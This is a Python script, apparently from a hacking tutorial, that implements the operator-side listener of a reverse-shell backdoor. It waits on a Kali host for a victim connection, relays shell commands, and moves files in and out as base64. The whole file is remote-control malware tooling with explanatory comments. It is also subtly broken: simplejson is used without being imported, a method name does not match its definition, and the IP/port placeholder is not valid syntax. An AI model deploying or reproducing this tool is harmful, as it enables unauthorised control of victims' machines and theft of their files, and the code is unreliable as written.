import socket
import json
import base64

class SocketListener:
	def __init__(self,ip,port):
		my_listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		my_listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		#setsockopt is used for using an instance(my_listener here), for more than 1 time.
		#socket.SOL_SOCKET is the first parameter followed by socket.SO_REUSEADDR which is the option name and we set the address to 1.
		my_listener.bind((ip,port))
		my_listener.listen(0)	#listens for the connection, 0 is the backlog, denotes after how many connections you want to stop getting connections.		
		print("Listeneing...")
		(self.my_connection, my_address) = my_listener.accept() #To accept the connection. Returns a tuple, consisting our connection and the address from which we are receiving.
		print("Connection ok from " + str(my_address))
	def json_send(self,data):
		json_data=json.dumps(data)							#json doesn't support encoding(which is done below), hence used simplejson.
		self.my_connection.send(json_data.encode("utf-8"))				#need to enocde it since python3 sends it as byte(or string) even if it's json. 
	def json_receive(self):
		json_data=""
		while True:
			try:
				json_data = json_data + self.my_connection.recv(1024).decode()		#decoded	
				return simplejson.loads(json_data)					#json -> simplejson
			except ValueError:
				continue
	def command_execution(self,command_input):
		self.json_send(command_input)
		if command_input[0] == "quit":
			self.my_connection.close()
			exit()
		return self.json_receive()
	def save_file(self,path,content):	#opening a file and naming it same as the path(name of the file(specified after download))				
		with open(path,"wb") as my_file:
			my_file.write(base64.b64decode(content))	#base64 decoding			
			return "download done"
	def get_file_contents(self,path):
		with open(path,"rb") as my_file:						
			return base64.b64encode(my_file.read())	
	def start_listener(self):
		while True:
			command_input = input("enter command: ")					#raw_input -> input
			command_input = command_input.split(" ")
			try:
				if command_input[0]=="upload":							
					my_file_content=self.get_file_content(command_input[1])	
					#note that we are putting it before getting the command output, (mAyBe because we want the output from windows after uploading the file)
					command_input.append(my_file_content)	
					#now the command_input becomes of 3 words-> upload <file_name> <content>					
				command_output = self.command_execution(command_input)	
				if command_input[0]== "download" and "error!" not in command_output:
					command_output=self.save_file(command_input[1],command_output)	#passing file name and its content as arguments.
			except	Exception:							#general exception for all errors.
				command_output="error"											
			print(command_output)	

my_socket_listener = SocketListener("<kaliIP>",<port>) ### **** INSERT YOURS *** ###
my_socket_listener.start_listener()